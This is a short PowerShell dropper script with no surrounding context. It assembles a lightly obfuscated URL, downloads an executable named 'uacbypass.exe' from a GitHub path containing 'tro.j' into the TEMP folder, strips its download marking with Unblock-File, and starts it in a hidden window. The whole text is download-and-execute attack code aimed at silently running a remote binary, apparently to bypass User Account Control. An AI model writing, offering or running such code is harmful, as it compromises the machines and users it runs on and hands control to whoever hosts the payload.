$u='ht'+'tps://github.com/gsfv/tro.j/raw/refs/heads/main/uacbypass.exe'
$p="$env:TEMP\uacbypass.exe"
(New-Object Net.WebClient).DownloadFile($u,$p)
Unblock-File $p
Start-Process $p -WindowStyle Hidden
